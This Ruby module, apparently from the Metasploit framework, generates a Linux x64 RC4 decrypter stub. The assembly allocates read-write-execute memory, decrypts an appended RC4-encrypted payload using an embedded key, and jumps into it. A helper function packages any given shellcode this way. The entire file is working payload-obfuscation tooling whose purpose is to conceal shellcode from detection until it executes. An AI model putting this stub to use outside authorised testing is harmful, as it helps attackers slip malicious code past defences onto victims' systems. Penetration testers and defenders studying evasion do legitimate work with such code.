module Msf::Payload::Linux::X64::Rc4Decrypter

  def rc4_decrypter_stub(key_size: 0, payload_size: 0, encrypted_size: 0)
    asm = <<-ASM
_start:
      jmp _get_data_addr

_got_data_addr:
      pop r12

      ; mmap(NULL, payload_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
      mov esi, #{payload_size}
      xor edi, edi
      mov edx, 7
      mov r10d, 0x22
      mov r8d, 0xffffffff
      xor r9d, r9d
      mov eax, 9
      syscall
      mov r13, rax

      ; Initialize S-box (256 bytes) on stack
      sub rsp, 256
      mov rdi, rsp
      xor ecx, ecx
_init_sbox:
      mov byte [rdi + rcx], cl
      inc ecx
      cmp ecx, 256
      jne _init_sbox

      ; RC4 Key Scheduling Algorithm (KSA)
      mov r8, r12
      mov r9d, #{key_size}
      xor ecx, ecx
      xor edx, edx
_ksa_loop:
      movzx eax, byte [rdi + rcx]
      add edx, eax
      mov eax, ecx
_mod_loop:
      cmp eax, r9d
      jb _mod_done
      sub eax, r9d
      jmp _mod_loop
_mod_done:
      movzx eax, byte [r8 + rax]
      add edx, eax
      and edx, 0xff
      movzx eax, byte [rdi + rcx]
      movzx r10d, byte [rdi + rdx]
      mov byte [rdi + rcx], r10b
      mov byte [rdi + rdx], al
      inc ecx
      cmp ecx, 256
      jne _ksa_loop

      ; RC4 Pseudo-Random Generation Algorithm (PRGA)
      lea r8, [r12 + 256]
      mov r9d, #{encrypted_size}
      xor ecx, ecx
      xor edx, edx
      xor r10d, r10d
_prga_loop:
      inc ecx
      and ecx, 0xff
      movzx eax, byte [rdi + rcx]
      add edx, eax
      and edx, 0xff
      movzx eax, byte [rdi + rcx]
      movzx r11d, byte [rdi + rdx]
      mov byte [rdi + rcx], r11b
      mov byte [rdi + rdx], al
      add eax, r11d
      and eax, 0xff
      movzx eax, byte [rdi + rax]
      xor al, byte [r8 + r10]
      mov byte [r13 + r10], al
      inc r10d
      cmp r10d, r9d
      jne _prga_loop

      add rsp, 256
      jmp r13

_get_data_addr:
      call _got_data_addr

; Data section layout:
; offset +0:   key_data (256 bytes)
; offset +256: encrypted_data (variable length)
    ASM

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

  def rc4_decrypter(opts = {})
    key            = opts[:key] || Rex::Text.rand_text(16)
    payload        = opts[:data] || raise(ArgumentError, "Encrypted data required")
    raise(ArgumentError, "Key must be <= 256 bytes") if key.length > 256

    encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)

    stub = rc4_decrypter_stub(
      key_size:       key.length,
      payload_size:   payload.length,
      encrypted_size: encrypted_data.length
    )

    stub << key.ljust(256, "\x00")
    stub << encrypted_data
  end

end